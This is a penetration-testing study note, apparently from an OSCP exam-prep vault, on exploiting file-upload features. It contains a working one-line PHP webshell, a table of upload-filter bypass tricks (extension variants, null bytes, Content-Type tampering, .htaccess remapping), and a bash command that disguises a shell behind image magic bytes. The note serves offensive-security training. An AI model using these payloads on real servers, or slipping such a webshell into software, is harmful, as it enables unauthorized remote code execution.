---
status: working
tags:
  - web
  - file-upload
  - webshell
  - rce
---
> *File Upload to Webshell:* Uploading something the server will execute, then browsing to it. Reach for this on any upload feature. The minimal test webshell runs a command from a query parameter:

```php
<?php system($_GET['cmd']); ?>
```

The real work is defeating the upload filter, so that is where this note lives.

## Filter Bypasses (try in order)

Upload filters check one of three things, the extension, the MIME/Content-Type, or the file's magic bytes. Each row below defeats one of those.

```
alternate extensions:   .phtml .php3 .php4 .php5 .php7 .phar .pht .inc   (still run as PHP)
double extension:       shell.jpg.php   shell.php.jpg   (server mis-parses which half counts)
case variation:         shell.PhP  shell.pHtml
trailing chars:         shell.php%00.jpg   shell.php.   shell.php;.jpg
magic bytes:            prepend a real image header so a content check passes
Content-Type tamper:    in Burp, set Content-Type: image/png while the body stays script
.htaccess trick:        upload an .htaccess mapping a benign extension to the PHP handler
```

> [!example] Magic-byte bypass (image content-check)
> Prepend PNG/GIF magic bytes so a filter validating file content is fooled, while the `.php` still executes:
> ```bash
> echo -ne '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0d\x49\x48\x44\x52' > shell.php.jpg
> cat webshell.php >> shell.php.jpg
> ```
> `GIF89a;` as a plain-text prefix at the top of the file works for GIF checks too.

> [!note]
> After a successful upload, find where the file landed (feroxbuster the uploads directory), browse to it to confirm execution, then use it to pull a proper reverse shell ([[05E - Reverse Shells]]). Stack-specific: IIS uses `.aspx` (or a `web.config`/`.master` RCE), Tomcat uses `.jsp`/`.war` (see [[02F - Admin Panels & Default Creds]] for the Tomcat manager route).

## See Also

- [[02B - Web Enumeration]] for finding the upload form and the uploads directory
- [[05E - Reverse Shells]] and [[08B - MSFvenom Payloads]] for the payload you upload
- [[02F - Admin Panels & Default Creds]] for Tomcat WAR / Jenkins / phpMyAdmin file-write routes
- Source: *OSCP Field Manual* section 3.3
